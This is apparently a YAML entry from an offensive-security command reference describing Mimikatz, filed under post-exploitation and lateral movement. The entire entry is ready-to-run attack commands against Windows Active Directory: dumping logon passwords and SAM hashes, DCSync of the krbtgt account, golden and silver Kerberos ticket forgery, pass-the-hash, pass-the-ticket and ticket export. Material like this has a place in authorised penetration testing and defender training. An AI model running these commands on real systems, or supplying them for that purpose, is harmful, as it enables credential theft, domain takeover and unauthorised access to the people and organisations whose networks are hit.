---
description: |
  Extract credentials, hashes, tickets from Windows memory.
  The essential post-exploitation tool for AD environments.
command: |
  # Dump logon passwords
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

  # Dump NTLM hashes
  mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

  # DCSync
  mimikatz.exe "privilege::debug" "lsadump::dcsync /user:test\krbtgt" "exit"

  # Golden Ticket
  mimikatz.exe "kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-... /krbtgt:HASH /ptt" "exit"

  # Silver Ticket
  mimikatz.exe "kerberos::golden /user:Administrator /domain:test.local /sid:S-1-5-21-... /target:dc.test.local /service:cifs /rc4:HASH /ptt" "exit"

  # Pass-the-Hash
  mimikatz.exe "privilege::debug" "sekurlsa::pth /user:admin /domain:test.local /ntlm:HASH" "exit"

  # Pass-the-Ticket
  mimikatz.exe "kerberos::ptt ticket.kirbi" "exit"

  # Export tickets
  mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
phase:
  - Post-Exploitation
  - Lateral_Movement
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
items:
  - Shell
  - Hash
techniques:
  - DCSync
  - Ticket_Forgery
  - Pass-the-Hash_Ticket
network_position:
  - Local
references:
  - https://github.com/gentilkiwi/mimikatz
---
